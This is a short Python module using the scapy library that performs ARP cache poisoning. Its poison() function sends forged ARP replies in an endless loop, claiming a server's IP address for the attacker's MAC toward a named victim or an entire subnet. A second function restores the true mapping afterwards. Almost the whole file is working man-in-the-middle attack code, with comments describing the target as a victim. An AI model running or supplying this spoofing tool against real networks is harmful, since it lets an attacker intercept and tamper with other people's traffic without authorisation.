# think at module level 
#this module spoof a server address to a target victim --> the target could be also the entire subnet
# import scapy if not already imported
from scapy.all import *

# does scapy actually know in which interface it must send packet?
TIMEOUT = 2

# poison target spoofing server IP address with fake server mac
def poison( target_ip, target_mac, server_ip, fake_server_mac ): # target and server should have an ip and a mac address
	print ("[*] Begin ARP poisoning..")

	arprq = ARP()
	arprq.psrc = server_ip # from IP
	arprq.pdst = target_ip # send to IP
	arprq.hwsrc = fake_server_mac # MY MAC
	arprq.op = 2 # arp rely THIS IP IS AT THIS MAC
	print ( "Sending: ", arprq.summary() )

	while True:
		send( arprq, verbose=0 )
		time.sleep( TIMEOUT )
	return

# restore target ARP table sending true mac address from server IP
def antitode( target_ip, target_mac, server_ip, real_server_mac ):
	print ("[*] ARP antitode..")
	arprq = ARP()
	arprq.psrc = server_ip # from IP
	arprq.pdst = target_ip # send to IP
	arprq.hwsrc = real_server_mac # this is my mac MAC
	arprq.op = 2 # arp rely THIS IP IS AT THIS MAC

	# this is used only for cleanup
	send( arprq, count=8, verbose=0 )

	return
